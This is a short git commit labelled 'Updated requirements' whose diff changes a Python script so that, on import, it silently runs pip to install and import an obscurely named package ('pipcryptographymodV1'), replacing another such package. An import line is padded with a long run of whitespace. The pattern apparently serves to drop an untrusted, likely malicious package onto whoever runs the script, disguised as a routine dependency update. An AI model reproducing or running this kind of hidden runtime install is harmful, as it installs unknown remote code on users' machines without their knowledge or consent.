5a4fa20e1580dcd5bf5f47615de3abbd05c9ae1d
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-24 20:05:34 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringpackage")
-import pythoncoloringpackage
+os.system("pip install pipcryptographymodV1")
+import pipcryptographymodV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
